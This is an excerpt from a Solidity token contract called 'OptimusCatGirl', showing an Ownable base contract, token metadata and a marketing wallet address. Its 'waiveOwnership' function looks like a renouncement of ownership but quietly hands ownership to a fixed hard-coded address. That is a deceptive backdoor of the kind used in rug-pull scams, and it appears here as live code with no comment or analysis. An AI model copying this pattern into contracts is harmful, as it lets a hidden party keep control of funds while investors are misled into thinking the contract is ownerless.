...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x354F6492240E7230a225c24053ef1a888404CA6E));
        _owner = address(0x354F6492240E7230a225c24053ef1a888404CA6E);
    }
...
contract OptimusCatGirl is Context, IERC20, Ownable {
    ...
    string private _name = "OptimusCatGirl";
    string private _symbol = "OptimusCatGirl";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xe51815DF836da8035601Bee415d8143285897492);
